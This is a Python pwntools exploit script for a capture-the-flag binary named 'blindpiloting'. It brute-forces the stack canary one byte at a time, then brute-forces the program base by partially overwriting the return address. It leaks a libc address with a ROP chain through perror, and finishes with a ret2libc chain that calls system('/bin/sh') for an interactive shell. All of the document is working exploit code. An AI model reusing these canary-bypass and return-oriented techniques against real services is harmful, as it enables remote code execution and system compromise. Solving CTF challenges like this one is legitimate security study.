#!/usr/bin/env python3

from pwn import *
import binascii
import sys

p = process('./blindpiloting')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = remote('pwn.ctf.b01lers.com',1007)
#libc = ELF('libc.so.6')

p.recvuntil('> ')
buf = 8 * b'A'
canary = p8(0)
x = [i for i in range(256) if i != 10 ]

for i in range(7):
	for j in x:
		payload = buf + canary + p8(j)
		p.sendline(payload)
		r = p.recvuntil('terminated',timeout=1)
		if not r:
			canary += p8(j)
			print(binascii.hexlify(canary))
			break
		p.clean()
	if r:
		print("FAILED, you prob got a LF (0xa) in canary")
		sys.exit(1)
		
print("HAVE CANARY")

bp = 8 * b'B'
flag1 = 0x9f0

for i in range(16):
	payload = buf + canary + bp + p16(flag1 + i * 0x1000)
	print(hex(flag1 + i * 0x1000))
	p.sendline(payload)
	_ = p.recvuntil('}',timeout=0.25)
	if _.find(b'pctf') != -1:
		print(_[_.find(b'pctf'):])
		break
	p.clean()

if _.find(b'pctf') == -1:
    print("FAILED, no base for you")
    sys.exit(1)

p.clean()
procbase = p16(flag1 + i * 0x1000)

for i in range(6):
	for j in x:
		payload = buf + canary + bp + procbase + p8(j)
		p.sendline(payload)
		r = p.recvuntil('> ')
		r += p.clean(timeout=0.25)
		if r.find(b'pctf') != -1:
			procbase += p8(j)
			print(binascii.hexlify(procbase))
			break
	if not r.find(b'pctf') != -1:
		print("FAILED, you prob got an LF (0xa) in stack")
		sys.exit(1)

procbase = int(procbase[::-1].hex(),16) ^ flag1
print(hex(procbase))
print("HAVE PROCBASE")

context.clear(arch='amd64')
rop = ROP('blindpiloting')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

binary = ELF('blindpiloting')
perror_got = binary.got['perror']
perror_plt = binary.plt['perror']

payload  = buf + canary + bp
payload += p64(procbase + pop_rdi)
payload += p64(procbase + perror_got)
payload += p64(procbase + perror_plt)

p.sendline(payload)

_ = p.recvuntil(': Success')
perror = int(_[:-9][-6:][::-1].hex(),16)
print(hex(perror))
libcbase = perror - libc.symbols['perror']
print(hex(libcbase))
print("HAVE LIBCBASE")

payload  = buf + canary + bp
payload += p64(procbase + pop_rdi + 1)
payload += p64(procbase + pop_rdi)
payload += p64(libcbase + next(libc.search(b"/bin/sh")))
payload += p64(libcbase + libc.symbols['system'])
p.sendline(payload)

p.interactive()
